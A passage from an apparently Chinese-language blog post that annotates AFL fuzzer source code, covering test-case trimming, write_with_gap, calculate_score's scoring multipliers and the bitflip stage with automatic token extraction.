*/</span></span><br><span class="line">  <span class="keyword">while</span> (remove_len &gt;= MAX(len_p2 / TRIM_END_STEPS, TRIM_MIN_BYTES)) &#123;</span><br><span class="line">    <span class="comment">/* 当前删除位置 */</span></span><br><span class="line">    u32 remove_pos = remove_len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 更新状态显示信息 */</span></span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;trim %s/%s&quot;</span>, DI(remove_len), DI(remove_len));</span><br><span class="line">    stage_cur = <span class="number">0</span>;</span><br><span class="line">    stage_max = q-&gt;len / remove_len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 内循环：尝试从不同位置删除数据块 */</span></span><br><span class="line">    <span class="keyword">while</span> (remove_pos &lt; q-&gt;len) &#123;</span><br><span class="line">      <span class="comment">/* 实际可删除的字节数（处理边界情况） */</span></span><br><span class="line">      u32 trim_avail = MIN(remove_len, q-&gt;len - remove_pos);</span><br><span class="line">      u32 cksum;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 创建删除了指定区域的测试用例</span></span><br><span class="line"><span class="comment">         将 [0, remove_pos) 和 [remove_pos+trim_avail, len) 的数据写入文件 */</span></span><br><span class="line">      write_with_gap(in_buf, q-&gt;len, remove_pos, trim_avail);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 运行目标程序，测试删除后的效果 */</span></span><br><span class="line">      fault = run_target(argv, exec_tmout);</span><br><span class="line">      trim_execs++;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 如果用户中断或执行错误，停止修剪 */</span></span><br><span class="line">      <span class="keyword">if</span> (stop_soon || fault == FAULT_ERROR)</span><br><span class="line">        <span class="keyword">goto</span> abort_trimming;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 计算当前执行路径的校验和 */</span></span><br><span class="line">      cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 关键判断：如果删除数据后路径覆盖没有变化，</span></span><br><span class="line"><span class="comment">         说明被删除的数据是冗余的，可以永久删除 */</span></span><br><span class="line">      <span class="keyword">if</span> (cksum == q-&gt;exec_cksum) &#123;</span><br><span class="line">        <span class="comment">/* 计算需要移动的尾部数据长度 */</span></span><br><span class="line">        u32 move_tail = q-&gt;len - remove_pos - trim_avail;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 更新长度 */</span></span><br><span class="line">        q-&gt;len -= trim_avail;</span><br><span class="line">        len_p2 = next_p2(q-&gt;len);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 将后面的数据向前移动，填补删除的空隙 */</span></span><br><span class="line">        memmove(in_buf + remove_pos, in_buf + remove_pos + trim_avail,</span><br><span class="line">                move_tail);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 第一次成功删除时，保存干净的执行路径</span></span><br><span class="line"><span class="comment">           这个路径信息稍后会用于 update_bitmap_score */</span></span><br><span class="line">        <span class="keyword">if</span> (!needs_write) &#123;</span><br><span class="line">          needs_write = <span class="number">1</span>;</span><br><span class="line">          <span class="built_in">memcpy</span>(clean_trace, trace_bits, MAP_SIZE);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="comment">/* 如果删除影响了路径，跳到下一个位置尝试 */</span></span><br><span class="line">        remove_pos += remove_len;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 定期更新界面显示，避免看起来像卡死 */</span></span><br><span class="line">      <span class="keyword">if</span> (!(trim_exec++ % stats_update_freq))</span><br><span class="line">        show_stats();</span><br><span class="line">      </span><br><span class="line">      stage_cur++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将删除块大小减半，进行更精细的修剪 */</span></span><br><span class="line">    remove_len &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果成功删除了一些内容，需要更新磁盘上的文件 */</span></span><br><span class="line">  <span class="keyword">if</span> (needs_write) &#123;</span><br><span class="line">    s32 fd;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 删除旧文件（忽略错误） */</span></span><br><span class="line">    unlink(q-&gt;fname); <span class="comment">/* ignore errors */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 创建新文件，写入修剪后的内容 */</span></span><br><span class="line">    fd = open(q-&gt;fname, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, q-&gt;fname);</span><br><span class="line">    </span><br><span class="line">    ck_write(fd, in_buf, q-&gt;len, q-&gt;fname);</span><br><span class="line">    close(fd);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 恢复干净的执行路径，用于后续评分 */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(trace_bits, clean_trace, MAP_SIZE);</span><br><span class="line">    <span class="comment">/* 更新这个测试用例的位图评分 */</span></span><br><span class="line">    update_bitmap_score(q);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">abort_trimming:</span><br><span class="line">  <span class="comment">/* 统计：累加修剪后的字节数 */</span></span><br><span class="line">  bytes_trim_out += q-&gt;len;</span><br><span class="line">  <span class="keyword">return</span> fault;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="write-with-gap"><a href="#write-with-gap" class="headerlink" title="write_with_gap"></a>write_with_gap</h4><p>这个函数的作用就是实际上对文件写的工作，这里可以发现每个文件都是从第二块开始删除的，是因为我文件头包括魔数等基本信息的内容，所以说要保留文件头，这里保留文件头的话还会导致某些信息对不上，比如长度什么的，但是既然是fuzz这种异常情况也可能帮助我们找到bug，所以无伤大雅，具体操作很简单看看下面的详细注释就行<br>我这里给个例子</p><p>假设调用 <code>write_with_gap(buffer, 100, 30, 20)</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原始数据 (buffer):</span><br><span class="line">[AAAAAAAAAA|BBBBBBBBBB|CCCCCCCCCC|DDDDDDDDDD|EEEEEEEEEE|...]</span><br><span class="line"> 0-10      10-20      20-30      30-40      40-50      50-100</span><br><span class="line"></span><br><span class="line">写入结果:</span><br><span class="line">[AAAAAAAAAA|BBBBBBBBBB|CCCCCCCCCC|EEEEEEEEEE|...]</span><br><span class="line"> 0-10      10-20      20-30      30-4040-80</span><br><span class="line"> </span><br><span class="line">跳过了 30-50 这20字节的数据 (DDDDDDDDDD部分)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">write_with_gap</span><span class="params">(<span class="keyword">void</span> *mem, u32 len, u32 skip_at, u32 skip_len)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* fd: 文件描述符，默认使用全局的 out_fd */</span></span><br><span class="line">  s32 fd = out_fd;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 计算尾部数据的长度</span></span><br><span class="line"><span class="comment">     例：总长100，从位置30跳过20字节</span></span><br><span class="line"><span class="comment">     tail_len = 100 - 30 - 20 = 50 (即50-100的数据) */</span></span><br><span class="line">  u32 tail_len = len - skip_at - skip_len;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 处理两种模式：文件模式 vs 标准输出模式 */</span></span><br><span class="line">  <span class="keyword">if</span> (out_file) &#123;</span><br><span class="line">    <span class="comment">/* ===== 文件模式：写入到指定文件 ===== */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 删除旧文件（如果存在），忽略错误 */</span></span><br><span class="line">    unlink(out_file); <span class="comment">/* Ignore errors. */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 创建新文件</span></span><br><span class="line"><span class="comment">       O_WRONLY: 只写模式</span></span><br><span class="line"><span class="comment">       O_CREAT: 如果不存在则创建</span></span><br><span class="line"><span class="comment">       O_EXCL: 确保创建新文件（如果已存在则失败）</span></span><br><span class="line"><span class="comment">       0600: 文件权限（所有者可读写） */</span></span><br><span class="line">    fd = open(out_file, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, out_file);</span><br><span class="line">      </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* ===== 标准输出模式：重用已打开的文件描述符 ===== */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 将文件指针移到开头，准备覆盖写入 */</span></span><br><span class="line">    lseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 写入数据（跳过中间部分）===== */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 1. 写入头部数据 [0, skip_at) </span></span><br><span class="line"><span class="comment">     例：写入位置 0-30 的数据 */</span></span><br><span class="line">  <span class="keyword">if</span> (skip_at)</span><br><span class="line">    ck_write(fd, mem, skip_at, out_file);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 2. 跳过中间部分 [skip_at, skip_at + skip_len)</span></span><br><span class="line"><span class="comment">     注意：这里不写入任何内容，直接跳过 */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 3. 写入尾部数据 [skip_at + skip_len, len)</span></span><br><span class="line"><span class="comment">     例：写入位置 50-100 的数据</span></span><br><span class="line"><span class="comment">     mem + skip_at + skip_len: 跳过前面部分，指向尾部数据的起始位置 */</span></span><br><span class="line">  <span class="keyword">if</span> (tail_len)</span><br><span class="line">    ck_write(fd, mem + skip_at + skip_len, tail_len, out_file);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 收尾工作 ===== */</span></span><br><span class="line">  <span class="keyword">if</span> (!out_file) &#123;</span><br><span class="line">    <span class="comment">/* 标准输出模式：调整文件大小并重置位置 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 截断文件到新的长度（原长度减去跳过的长度）</span></span><br><span class="line"><span class="comment">       例：原100字节，跳过20字节，新长度80字节 */</span></span><br><span class="line">    <span class="keyword">if</span> (ftruncate(fd, len - skip_len))</span><br><span class="line">      PFATAL(<span class="string">&quot;ftruncate() failed&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 将文件指针重新移到开头，为下次使用做准备 */</span></span><br><span class="line">    lseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* 文件模式：关闭文件 */</span></span><br><span class="line">    close(fd);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写完之后就再次运行看效果，看看fault的种类，再根据路径校验和来检查是否和之前有区别，如果可以修剪就修改in_file,这样下次传入<em>write_with_gap</em>也会被修改，在多个循环和删除块大小减半再循环直到<code>remove_len &gt;= MAX(len_p2 / TRIM_END_STEPS, TRIM_MIN_BYTES)</code>不满足，然后退出大循环，再将<em>in_file</em>写回到文件。然后再通过<strong>update_bitmap_score</strong>再次评分，这里回看这个函数，我们发现计分方式是<code>u64 fav_factor = q-&gt;exec_us * q-&gt;len;</code>但是我们可以看到包括之前的<em>run_target</em>都没有更新<em>q-&gt;exec_us</em>，当然由于路径都没有变化自然<em>q-&gt;exec_us</em>不会有大变化，所以没有计算，这里主要考虑q-&gt;len的改变。重点的内容就是这些了我们再次回到fuzz_one。</p><p>完成修剪之后对样例打上标记<code>queue_cur-&gt;trim_done = 1</code> ，再更新fuzz_one本地变量<em>len</em>，然后复制输入到输出缓冲区，准备开始变异。</p><p>首先调用<strong>calculate_score</strong></p><h3 id="calculate-score"><a href="#calculate-score" class="headerlink" title="calculate_score"></a>calculate_score</h3><p>这个函数主要是为样例打分，根据平均的执行时机和平均位图大小来比较从而获取一个大致的分数，以及根据深度和延迟发现补偿做一些调整。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Calculate case desirability score to adjust the length of havoc fuzzing.</span></span><br><span class="line"><span class="comment">   A helper function for fuzz_one(). Maybe some of these constants should</span></span><br><span class="line"><span class="comment">   go into config.h. */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">calculate_score</span><span class="params">(struct queue_entry *q)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* 计算全局平均执行时间（微秒）</span></span><br><span class="line"><span class="comment">     total_cal_us: 所有校准执行的总时间</span></span><br><span class="line"><span class="comment">     total_cal_cycles: 总校准次数 */</span></span><br><span class="line">  u32 avg_exec_us = total_cal_us / total_cal_cycles;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 计算平均位图大小（覆盖的路径数量）</span></span><br><span class="line"><span class="comment">     total_bitmap_size: 所有测试用例的位图大小总和</span></span><br><span class="line"><span class="comment">     total_bitmap_entries: 测试用例总数 */</span></span><br><span class="line">  u32 avg_bitmap_size = total_bitmap_size / total_bitmap_entries;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 基础分数 100（相当于 1.0x 倍率） */</span></span><br><span class="line">  u32 perf_score = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 1. 执行速度调整 ===== </span></span><br><span class="line"><span class="comment">     快的输入更便宜，给它们更多 fuzzing 时间</span></span><br><span class="line"><span class="comment">     倍率范围：0.1x 到 3x */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">0.1</span> &gt; avg_exec_us)</span><br><span class="line">    perf_score = <span class="number">10</span>;   <span class="comment">// 极慢：执行时间 &gt; 平均值的10倍 → 0.1x</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">0.25</span> &gt; avg_exec_us)</span><br><span class="line">    perf_score = <span class="number">25</span>;   <span class="comment">// 很慢：执行时间 &gt; 平均值的4倍 → 0.25x</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">0.5</span> &gt; avg_exec_us)</span><br><span class="line">    perf_score = <span class="number">50</span>;   <span class="comment">// 慢：执行时间 &gt; 平均值的2倍 → 0.5x</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">0.75</span> &gt; avg_exec_us)</span><br><span class="line">    perf_score = <span class="number">75</span>;   <span class="comment">// 稍慢：执行时间 &gt; 平均值的1.33倍 → 0.75x</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">4</span> &lt; avg_exec_us)</span><br><span class="line">    perf_score = <span class="number">300</span>;  <span class="comment">// 极快：执行时间 &lt; 平均值的1/4 → 3x</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">3</span> &lt; avg_exec_us)</span><br><span class="line">    perf_score = <span class="number">200</span>;  <span class="comment">// 很快：执行时间 &lt; 平均值的1/3 → 2x</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">2</span> &lt; avg_exec_us)</span><br><span class="line">    perf_score = <span class="number">150</span>;  <span class="comment">// 快：执行时间 &lt; 平均值的1/2 → 1.5x</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 2. 代码覆盖率调整 ===== </span></span><br><span class="line"><span class="comment">     覆盖更多路径的输入更有价值</span></span><br><span class="line"><span class="comment">     倍率范围：0.25x 到 3x */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">0.3</span> &gt; avg_bitmap_size)</span><br><span class="line">    perf_score *= <span class="number">3</span>;     <span class="comment">// 优秀覆盖：&gt; 平均值的3.33倍 → 3x</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">0.5</span> &gt; avg_bitmap_size)</span><br><span class="line">    perf_score *= <span class="number">2</span>;     <span class="comment">// 良好覆盖：&gt; 平均值的2倍 → 2x</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">0.75</span> &gt; avg_bitmap_size)</span><br><span class="line">    perf_score *= <span class="number">1.5</span>;   <span class="comment">// 不错覆盖：&gt; 平均值的1.33倍 → 1.5x</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">3</span> &lt; avg_bitmap_size)</span><br><span class="line">    perf_score *= <span class="number">0.25</span>;  <span class="comment">// 很差覆盖：&lt; 平均值的1/3 → 0.25x</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">2</span> &lt; avg_bitmap_size)</span><br><span class="line">    perf_score *= <span class="number">0.5</span>;   <span class="comment">// 差覆盖：&lt; 平均值的1/2 → 0.5x</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">1.5</span> &lt; avg_bitmap_size)</span><br><span class="line">    perf_score *= <span class="number">0.75</span>;  <span class="comment">// 稍差覆盖：&lt; 平均值的2/3 → 0.75x</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 3. 延迟发现补偿（handicap）===== </span></span><br><span class="line"><span class="comment">     后期发现的路径获得补偿时间，让它们赶上进度</span></span><br><span class="line"><span class="comment">     handicap 值随时间递减 */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (q-&gt;handicap &gt;= <span class="number">4</span>) &#123;</span><br><span class="line">    perf_score *= <span class="number">4</span>;     <span class="comment">// 大补偿：4x 倍率</span></span><br><span class="line">    q-&gt;handicap -= <span class="number">4</span>;    <span class="comment">// 减少 handicap 值</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;handicap) &#123;</span><br><span class="line">    perf_score *= <span class="number">2</span>;     <span class="comment">// 小补偿：2x 倍率</span></span><br><span class="line">    q-&gt;handicap--;       <span class="comment">// 减少 handicap 值</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 4. 输入深度调整 ===== </span></span><br><span class="line"><span class="comment">     深度越大的测试用例（经过更多轮变异产生的）可能发现传统 fuzzer 找不到的问题</span></span><br><span class="line"><span class="comment">     给予更多测试时间 */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">switch</span> (q-&gt;depth) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span> ... <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">break</span>;              <span class="comment">// 浅层输入：无加成</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">4</span> ... <span class="number">7</span>:</span><br><span class="line">    perf_score *= <span class="number">2</span>;    <span class="comment">// 中等深度：2x</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">8</span> ... <span class="number">13</span>:</span><br><span class="line">    perf_score *= <span class="number">3</span>;    <span class="comment">// 较深：3x</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">14</span> ... <span class="number">25</span>:</span><br><span class="line">    perf_score *= <span class="number">4</span>;    <span class="comment">// 深：4x</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    perf_score *= <span class="number">5</span>;    <span class="comment">// 极深(&gt;25)：5x</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 确保不超过最大限制</span></span><br><span class="line"><span class="comment">     HAVOC_MAX_MULT 通常是 16</span></span><br><span class="line"><span class="comment">     所以最大分数是 1600 (16x 基础值) */</span></span><br><span class="line">  <span class="keyword">if</span> (perf_score &gt; HAVOC_MAX_MULT * <span class="number">100</span>)</span><br><span class="line">    perf_score = HAVOC_MAX_MULT * <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> perf_score;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是真正的变异阶段了首先是简单位翻转阶段</p><h3 id="简单位翻转阶段"><a href="#简单位翻转阶段" class="headerlink" title="简单位翻转阶段"></a>简单位翻转阶段</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*********************************************</span></span><br><span class="line"><span class="comment"> * 简单位翻转阶段 (同时构建自动字典)</span></span><br><span class="line"><span class="comment"> *********************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* FLIP_BIT宏：翻转指定位置的单个位</span></span><br><span class="line"><span class="comment">   参数：_ar - 字节数组</span></span><br><span class="line"><span class="comment">        _b  - 要翻转的位的索引（从0开始）</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">   工作原理：</span></span><br><span class="line"><span class="comment">   1. (_bf) &gt;&gt; 3：获取字节索引（位索引除以8）</span></span><br><span class="line"><span class="comment">   2. (_bf) &amp; 7：获取字节内的位偏移（0-7）</span></span><br><span class="line"><span class="comment">   3. 128 &gt;&gt; ((_bf) &amp; 7)：创建掩码（10000000 右移相应位数）</span></span><br><span class="line"><span class="comment">   4. ^=：异或操作翻转该位</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">   例：翻转第10位（索引9）</span></span><br><span class="line"><span class="comment">   字节索引 = 9 &gt;&gt; 3 = 1</span></span><br><span class="line"><span class="comment">   位偏移 = 9 &amp; 7 = 1</span></span><br><span class="line"><span class="comment">   掩码 = 128 &gt;&gt; 1 = 01000000</span></span><br><span class="line"><span class="comment">   _arf[1] ^= 01000000  // 翻转第1字节的第1位</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLIP_BIT(_ar, _b)                                                      \</span></span><br><span class="line"><span class="meta">  do &#123;                                                                         \</span></span><br><span class="line"><span class="meta">    u8 *_arf = (u8 *)(_ar);                                                    \</span></span><br><span class="line"><span class="meta">    u32 _bf = (_b);                                                            \</span></span><br><span class="line"><span class="meta">    _arf[(_bf) &gt;&gt; 3] ^= (128 &gt;&gt; ((_bf) &amp; 7));                                  \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ===== 阶段1：单个位翻转 ===== */</span></span><br><span class="line">stage_short = <span class="string">&quot;flip1&quot;</span>;</span><br><span class="line">stage_max = len &lt;&lt; <span class="number">3</span>;        <span class="comment">/* 总位数 = 字节数 * 8 */</span></span><br><span class="line">stage_name = <span class="string">&quot;bitflip 1/1&quot;</span>;  <span class="comment">/* 每次翻转1位，步长1位 */</span></span><br><span class="line"></span><br><span class="line">stage_val_type = STAGE_VAL_NONE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 记录初始状态，用于统计本阶段的发现 */</span></span><br><span class="line">orig_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line">prev_cksum = queue_cur-&gt;exec_cksum;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 遍历每一位 */</span></span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">    stage_cur_byte = stage_cur &gt;&gt; <span class="number">3</span>; <span class="comment">/* 当前位所在的字节位置 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 翻转当前位 */</span></span><br><span class="line">    FLIP_BIT(out_buf, stage_cur);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 执行变异后的测试用例，检查是否发现新路径或崩溃 */</span></span><br><span class="line">    <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 恢复位（准备下一次变异） */</span></span><br><span class="line">    FLIP_BIT(out_buf, stage_cur);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 自动字典提取机制 =====</span></span><br><span class="line"><span class="comment">   通过观察位翻转对执行路径的影响，自动识别输入中的关键token</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   核心原理：</span></span><br><span class="line"><span class="comment">   - 普通数据：改变一位，路径变化不大</span></span><br><span class="line"><span class="comment">   - 关键token（如&quot;PNG&quot;, &quot;SELECT&quot;等）：改变任何一位都导致路径剧变</span></span><br><span class="line"><span class="comment">   - 通过检测连续的&quot;敏感&quot;字节来识别token</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 只在每个字节的最后一位（位7）进行检查</span></span><br><span class="line"><span class="comment">       stage_cur &amp; 7 == 7 表示当前是字节的第7位（最低位）</span></span><br><span class="line"><span class="comment">       这样每8位只检查一次，减少开销 */</span></span><br><span class="line">    <span class="keyword">if</span> (!dumb_mode &amp;&amp; (stage_cur &amp; <span class="number">7</span>) == <span class="number">7</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 计算当前执行路径的校验和 */</span></span><br><span class="line">      u32 cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* ===== 情况1：文件末尾特殊处理 ===== */</span></span><br><span class="line">      <span class="keyword">if</span> (stage_cur == stage_max - <span class="number">1</span> &amp;&amp; cksum == prev_cksum) &#123;</span><br><span class="line">        <span class="comment">/* 条件：</span></span><br><span class="line"><span class="comment">           1. stage_cur == stage_max - 1：这是文件的最后一位</span></span><br><span class="line"><span class="comment">           2. cksum == prev_cksum：路径没有变化（还在同一个token内）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           问题：到了文件末尾，不会再有路径变化来触发token保存</span></span><br><span class="line"><span class="comment">           解决：强制收集当前字节并保存token */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 收集最后一个字节（如果缓冲区未满） */</span></span><br><span class="line">        <span class="keyword">if</span> (a_len &lt; MAX_AUTO_EXTRA)</span><br><span class="line">          a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="number">3</span>];</span><br><span class="line">        a_len++;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 如果收集的token长度合理，保存到字典 */</span></span><br><span class="line">        <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">          maybe_add_auto(a_collect, a_len);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* ===== 情况2：检测到token边界 ===== */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (cksum != prev_cksum) &#123;</span><br><span class="line">        <span class="comment">/* 路径模式发生变化，可能原因：</span></span><br><span class="line"><span class="comment">           1. 从token内部移动到token外部</span></span><br><span class="line"><span class="comment">           2. 从一个token移动到另一个token</span></span><br><span class="line"><span class="comment">           3. 从非敏感区域移动到敏感区域</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           这是分割token的信号 */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 保存之前收集的字节序列（如果长度合理） */</span></span><br><span class="line">        <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">          maybe_add_auto(a_collect, a_len);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 重置收集状态，准备收集新的token */</span></span><br><span class="line">        a_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 更新路径校验和基准，用于后续比较 */</span></span><br><span class="line">        prev_cksum = cksum;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/* 注意：没有else，下面的if是独立的！ */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* ===== 情况3：收集活跃字节（总是检查）===== */</span></span><br><span class="line">      <span class="comment">/* 这个if独立执行，不管上面的条件是否满足</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         判断：当前字节是否&quot;活跃&quot;（翻转它会改变执行路径）</span></span><br><span class="line"><span class="comment">         queue_cur-&gt;exec_cksum 是原始输入的路径校验和</span></span><br><span class="line"><span class="comment">         cksum 是翻转当前位后的路径校验和 */</span></span><br><span class="line">      <span class="keyword">if</span> (cksum != queue_cur-&gt;exec_cksum) &#123;</span><br><span class="line">        <span class="comment">/* 当前字节是活跃的，应该被收集 */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 防止缓冲区溢出 */</span></span><br><span class="line">        <span class="keyword">if</span> (a_len &lt; MAX_AUTO_EXTRA)</span><br><span class="line">          a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 增加收集长度</span></span><br><span class="line"><span class="comment">           注意：即使超过MAX_AUTO_EXTRA也要增加a_len</span></span><br><span class="line"><span class="comment">           这样可以知道实际token长度，即使无法完全收集 */</span></span><br><span class="line">        a_len++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 统计本阶段的成果 */</span></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line">stage_finds[STAGE_FLIP1] += new_hit_cnt - orig_hit_cnt;  <span class="comment">/* 新发现数 */</span></span><br><span 